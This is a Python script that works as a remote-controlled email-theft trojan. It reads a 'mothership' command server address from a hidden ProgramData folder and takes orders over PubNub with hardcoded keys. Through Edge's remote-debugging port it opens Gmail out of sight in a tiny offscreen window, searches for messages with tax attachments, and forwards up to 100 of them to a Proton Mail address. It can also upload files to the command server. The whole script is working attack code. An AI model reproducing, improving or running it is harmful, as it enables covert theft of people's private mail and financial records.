# https://onecompiler.com/python/44me4y8rn

# clear ; & "E:\__Binaries\Portable Python-3.10.5 x64\App\Python\python.exe" test.py
# "C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe" --profile-directory=Default --remote-debugging-port=9222 --remote-allow-origins=*

# python -m pip install psutil
# python -m pip install requests
# python -m pip install websocket
# pip list -v

from collections import deque

from datetime import datetime
import time
from pubnub.pubnub import PubNub
from pubnub.pnconfiguration import PNConfiguration
from pubnub.pubnub import PubNub
from pubnub.callbacks import SubscribeCallback
from pubnub.enums import PNStatusCategory

import traceback
import psutil
import inspect
import time
import sys
import websocket
import json
import requests
import tempfile
import os
from pathlib import Path
from datetime import datetime
import random
from urllib.parse import quote

trojandir = 'C:\\ProgramData\\owd'

def gettimestamp():
    now = datetime.now()
    timestamp = now.strftime('%Y%m%d%H%M%S%f')[:-3]

    return timestamp

def logmsg(msgstr):
    print(msgstr)

    if( logf ):
        logf.write(f"{msgstr}\r\n")
        logf.flush()  

def get_clientid():
    clientid_file = os.path.join(trojandir, 'client_id')
    tclientid=""

    with open(clientid_file, 'r') as f:
        tclientid = f.read().strip()

    return tclientid

def get_mothership():
    tmothershipfpath = os.path.join(trojandir, 'mothership')
    tmothership=""

    with open(tmothershipfpath, 'r') as f:
        tmothership = f.read().strip()

    return tmothership

mothership = get_mothership()

timestamp = gettimestamp()
script_full_path = Path(__file__).resolve()
script_fname = Path(__file__).name
source = script_fname
scriptdir_full_path = script_full_path.parent

logfname=script_fname + "_" + timestamp + ".log"
logfpath = os.path.join(scriptdir_full_path, logfname)
logf = open(logfpath, 'w', encoding='utf-8')

clientid=get_clientid()
sessionid = str(random.randint(10000000, 99999999))
batchid = sessionid

messageindex = 0
messagestack = deque([])

logmsg("starting relay_host:  "+script_fname+" args count: "+str(len(sys.argv))+ " args: "+" ".join(sys.argv) + " -- " + timestamp)

####

config = PNConfiguration()
config.publish_key = "pub-c-a00eaad9-c35e-4a41-bd62-cdc619a6f2cc"
config.subscribe_key = "sub-c-94ed1e1c-a765-4fd9-ba9e-f8ebbb47f5bd"
config.uuid = f"mothership"

pubnub = PubNub(config)
client_channel = f"clientid_{clientid}_PYTHON_client"
mothership_channel = f"clientid_{clientid}_PYTHON_mothership"

subscription = pubnub.channel(client_channel).subscription()

logmsg(f"pubnub: mothership_channel: {mothership_channel} client_channel: {client_channel}")

def publish_callback(result, status):
    if not status.is_error():
        logmsg(f"pubnub: Message published with timetoken: {result.timetoken}")
    else:
        logmsg(f"pubnub: Publish failed with status: {status.category}")

def publish_msg(msgdict):

    if not msgdict:
        return
    
    logmsg(f"pubnub: publishing message on {client_channel}")
    result = pubnub.publish().channel(client_channel).message(msgdict).pn_async(publish_callback)
    return result

# pubnub.publish().channel(client_channel).message(my_message).pn_async(publish_callback)

def handle_message(message_event):
    if not message_event:
        return;

    logmsg(f"pubnub: received message_event on channel [{message_event.channel}]: {message_event.message}")

    result = hostgetnextmessage(message_event.message)
    return result

    my_message = {
        "event": "sensor_update",
        "device_id": "sensor_01",
        "temperature": 22.5,
        "status": "active",
        "ts": datetime.now().strftime('%Y%m%d%H%M%S%f')[:-3]
    }

    logmsg("publishing response")

    pubnub.publish().channel(client_channel).message(my_message).pn_async(publish_callback)
    
    time.sleep(3)

subscription.on_message = handle_message

subscription.subscribe()

logmsg(f"pubnub: Successfully connected. Listening for events on: {client_channel}, sending messages on {client_channel}")

####

def exec_js(query, targetid,log=True):
    payload = {
        "id": 1,
        "method": "Runtime.evaluate",
        "params": {
            "expression": query,
            "returnByValue": True
        },
    }

    ws_url = "ws://localhost:9222/devtools/page/"+targetid
        
    obj_dict = {
        "payload": payload,
        "ws_url": ws_url
    }

    msgstr = json.dumps(obj_dict)

    return msgstr

def get_target_info(targetid):
    payload = {
        "id": 1, # should be unique set by client
        "method": "Target.getTargetInfo",
        "params": {
            "targetId": targetid
        }
    }

    obj_dict = {
        "payload": payload,
        "ws_url": "ws_url"  # client will set this url
    }

    msgstr = json.dumps(obj_dict)

    return msgstr

    '''
    {
    "id": 1,
    "result": {
        "targetInfo": {
        "targetId": "AE43B398A17CBB33EE61DCC93F947BB2",
        "type": "page",
        "title": "Inbox - michaelbradfield2@gmail.com - Gmail",
        "url": "https://mail.google.com/mail/u/0/#inbox",
        "attached": false,
        "canAccessOpener": false,
        "browserContextId": "1E133C6E02D871898A9E5564337B526F",
        "pid": 33960
        }
    }
    }
    '''

def get_window_id(targetid):
    payload = {
        "id": 1,
        "method": "Browser.getWindowForTarget",
        "params": {
            "targetId": targetid
        }
    }

    obj_dict = {
        "payload": payload,
        "ws_url": "ws_url"  # client will set this url
    }

    msgstr = json.dumps(obj_dict)

    return msgstr

    # '{"id":1,"result":{"windowId":1712041950,"bounds":{"left":483,"top":385,"width":515,"height":91,"windowState":"normal"}}}'

def get_window_bounds(windowid):
    payload = {
        "id": 1,
        "method": "Browser.getWindowBounds",
        "params": {
            "windowId": windowid
        }
    }

    obj_dict = {
        "payload": payload,
        "ws_url": "ws_url"  # client will set this url
    }

    msgstr = json.dumps(obj_dict)

    return msgstr
    # '{"id":1,"result":{"bounds":{"left":78,"top":115,"width":516,"height":123,"windowState":"minimized"}}}'

    return result

def set_window_bounds(windowid, left=None, top=None,width=None, height=None, windowState=None):
    bounds = {}

    if left: 
        bounds["left"] = left
    if top: 
        bounds["top"] = top
    if width: 
        bounds["width"] = width
    if height: 
        bounds["height"] = height
    if windowState: 
        bounds["windowState"] = windowState

    payload = {
        "id": 1,
        "method": "Browser.setWindowBounds",
        "params": {
            "windowId": windowid,
            "bounds": bounds
        }
    }

    obj_dict = {
        "payload": payload,
        "ws_url": "ws_url"  # client will set this url
    }

    msgstr = json.dumps(obj_dict)

    return msgstr

def close_window(targetid):
    payload = {
        "id": 1,
        "method": "Target.closeTarget",
        "params": {
            "targetId": targetid
        }
    }

    ws_url = "ws://localhost:9222/devtools/page/"+targetid
        
    obj_dict = {
        "payload": payload,
        "ws_url": ws_url
    }

    msgstr = json.dumps(obj_dict)

    return msgstr    

def create_target(url):
    payload = {
        "id": 1,
        "method": "Target.createTarget",
        "params": {
            "url": url,
            "newWindow": True,
            "width": 10,
            "height": 10,
            "left": 2000,
            "top": 2000
            #"windowState": "minimized"
            #"hidden": True
        }
    }

    obj_dict = {
        "payload": payload,
        "ws_url": "ws_url"
    }

    # msgstr = json.dumps(obj_dict)

    return obj_dict

def navigate(url, targetid):
    payload = {
        "id": 1,
        "method": "Page.navigate",
        "params": {
            "url": url #"https://mail.google.com/mail/u/0/#search/has%3Aattachment+tax"
        }
    }

    ws_url = "ws://localhost:9222/devtools/page/"+targetid
        
    obj_dict = {
        "payload": payload,
        "ws_url": ws_url
    }

    msgstr = json.dumps(obj_dict)

    return msgstr

def upload_file(filepath):
    logmsg(f"uploading file: {filepath}".replace("\\", "\\\\"))

    fpath = Path(filepath).resolve()
    fname = Path(filepath).name

    url = f"{mothership}/ow/upload.php?"
    url += f"batchid={batchid}"
    url += f"&filename={fname}"
    url += f"&clientid={clientid}"
    url += f"&source={source}"
    with open(fpath, 'rb') as f:
        response = requests.post(url, data=f)

    return response

def upload_txt(txtstr, fname):
    ts = gettimestamp()
    fpath = os.path.join(scriptdir_full_path, fname)

    with open(fpath, 'w', encoding='utf-8') as f:
        f.write(txtstr)

    if ( os.path.exists(fpath) ):
        upload_file(fpath)

def get_window_url(targetid):
    msgstr = exec_js("window.location.href", targetid)
    return msgstr

def click_on_email_msg(targetid, rowindex=0):
    query = """ Array.from(document.querySelectorAll("tbody tr td.yX.xY.ulKHrd[role='gridcell']"))[ """ + str(rowindex) + """ ].click() """

    result = exec_js(query, targetid)

    return result

def click_on_forward_button(targetid):
    query = """    
    Array.from(document.querySelectorAll('div.nH.bkK span[role="link"]'))
      .filter(span => span.textContent.trim() === 'Forward')[0].click();
    """

    result = exec_js(query, targetid)
    
    return result

def enter_email_addr(targetid, emailaddr="7c7db798e022e6fa1ac2aea62975cc23@proton.me"):
    dq = "\""
    query = """Array.from(document.querySelectorAll('input[aria-label="To recipients"]'))[0].value =""" + dq  + emailaddr + dq + ";"

    result = exec_js(query, targetid)
    return result

def click_on_send_button(targetid):
    query = """    
    Array.from(document.querySelectorAll('div[role="button"][data-tooltip*="Send"]'))[0].click()
    """

    result = exec_js(query, targetid)

    return result

def get_number_of_messages(targetid):
    query = """
        Array.from(document.querySelectorAll("tbody tr td.yX.xY.ulKHrd[role='gridcell']")).length
    """

    result = exec_js(query, targetid)
    return result

def hostpushmessage(msgobj):
    global messageindex
    messageid=str(messageindex)

    if not msgobj:
        return None
    
    messageindex = messageindex + 1

    msgobj["MessageID"] = messageindex
    msgobj["ts"] = gettimestamp() 

    response = publish_msg(msgobj)

    # response = requests.post(url, data=msgstr.encode('utf-8'), headers={'Content-Type': 'application/json'})
    # objdict = json.loads(response.text)
    # messageid = objdict["MessageID"]
    
    return response # messageid.strip()

def wait_hostgetnextmessage(messageid, waitsec=1):
    pp = inspect.currentframe().f_code.co_name
    logmsg(f"{pp}: waiting for response from client...")
    
    result = None
    while True:
        if ( len(messagestack) > 0 ):
            messageobj = messagestack.pop()
            
            messageid = messageobj["MessageID"]
            
            logmsg(f"{pp}: client generated response: {messageid} -- {messageobj}")

            return messageobj
        else:
            time.sleep(waitsec)

    return result

def hostgetnextmessage(messageobj):
    pp = inspect.currentframe().f_code.co_name
    logmsg(f"{pp} starting")

    messagestack.appendleft(messageobj)

    return messageobj

def host_loop():
    global messageindex

    logmsg("host_loop: starting "+inspect.currentframe().f_code.co_name)
 
    gmail_url = "https://mail.google.com/mail/u/0/#search/has%3Aattachment+tax"    
    msgobj = create_target(gmail_url)

    messageid = hostpushmessage(msgobj)

    result = wait_hostgetnextmessage(messageid)
    isvalid = int(result["MessageID"]) == messageindex
    result = result["payload"]

    targetid = result["targetId"]
    #targetid = "BA06E14CC79F84CB1A0B60765E497C7A"

    msgstr = get_window_id(targetid)
    messageid = hostpushmessage(msgstr)
    result = wait_hostgetnextmessage(messageid)
    windowid = result["windowId"]

    msgstr = set_window_bounds(windowid, left=2000, top=2000,width=10, height=10)
    messageid = hostpushmessage(msgstr)
    result = wait_hostgetnextmessage(messageid)
                  
    msgstr = exec_js("window.location.href", targetid)
    messageid = hostpushmessage(msgstr)
    result = wait_hostgetnextmessage(messageid)
    window_url = result["result"]["value"]
    # 'https://mail.google.com/mail/u/0/#search/has%3Aattachment+tax'

    msgstr = exec_js("document.documentElement.outerHTML", targetid)
    messageid = hostpushmessage(msgstr)
    result = wait_hostgetnextmessage(messageid)
    window_html = result["result"]["value"]
    # write html to file

    msgstr = click_on_email_msg(targetid)
    messageid = hostpushmessage(msgstr)
    result = wait_hostgetnextmessage(messageid)
    # {"result": {"type": "undefined"}}
    # upload_txt(result_txt, "page_html_src_"+gettimestamp()+".html")

    msgstr = exec_js("window.location.href", targetid)
    messageid = hostpushmessage(msgstr)
    result = wait_hostgetnextmessage(messageid)
    window_url = result["result"]["value"]
    # 'https://mail.google.com/mail/u/0/#search/has%3Aattachment+tax'

    msgstr = click_on_forward_button(targetid)
    messageid = hostpushmessage(msgstr)
    result = wait_hostgetnextmessage(messageid)
    # {"result": {"type": "undefined"}}
    # result["result"]["type"] == "undefined"

    msgstr = enter_email_addr(targetid, "7c7db798e022e6fa1ac2aea62975cc23@proton.me")
    messageid = hostpushmessage(msgstr)
    result = wait_hostgetnextmessage(messageid)
    # {"result": {"type": "undefined"}}

    msgstr = click_on_send_button(targetid)
    messageid = hostpushmessage(msgstr)
    result = wait_hostgetnextmessage(messageid)

    msgstr = navigate(gmail_url, targetid)
    messageid = hostpushmessage(msgstr)
    result = wait_hostgetnextmessage(messageid)
    # "{'frameId': '43A777A2FFD90E9F9BA7EE31ACFC7BA3', 'isDownload': False}"

    msgstr= get_number_of_messages(targetid)
    messageid = hostpushmessage(msgstr)
    result = wait_hostgetnextmessage(messageid)
    msg_count =  result["result"]["value"]
    msg_count = int(msg_count)
    
    msg_count=100

    for i in range(1, msg_count):
        
        logmsg(f"processing message index: {i}")

        msgstr = click_on_email_msg(targetid, i)
        messageid = hostpushmessage(msgstr)
        result = wait_hostgetnextmessage(messageid)

        msgstr = get_window_url(targetid)
        messageid = hostpushmessage(msgstr)
        result = wait_hostgetnextmessage(messageid)
        # logmsg(f"email url: {result_txt}")

        msgstr = click_on_forward_button(targetid)
        messageid = hostpushmessage(msgstr)
        result = wait_hostgetnextmessage(messageid)

        msgstr = enter_email_addr(targetid, "7c7db798e022e6fa1ac2aea62975cc23@proton.me")
        messageid = hostpushmessage(msgstr)
        result = wait_hostgetnextmessage(messageid)

        msgstr = click_on_send_button(targetid)
        messageid = hostpushmessage(msgstr)
        result = wait_hostgetnextmessage(messageid)

        msgstr = navigate(gmail_url, targetid)
        messageid = hostpushmessage(msgstr)
        result = wait_hostgetnextmessage(messageid)

    ###
    
    msgstr = close_window(targetid)
    messageid = hostpushmessage(msgstr)
    result = wait_hostgetnextmessage(messageid)

    sys.exit(0)
    pass

# builtincmd not implemented
if __name__ == "__main__":
    logmsg("starting relay loop " + gettimestamp())
    
    try:
        host_loop()

    except Exception as exp:
        msg = str(exp)
        logmsg(f"Basic Message: {msg}")

        tech_msg = repr(exp)
        logmsg(f"Technical View: {tech_msg}")

        full_trace = traceback.format_exc()
        logmsg(f"Full Stack Trace:\n{full_trace}")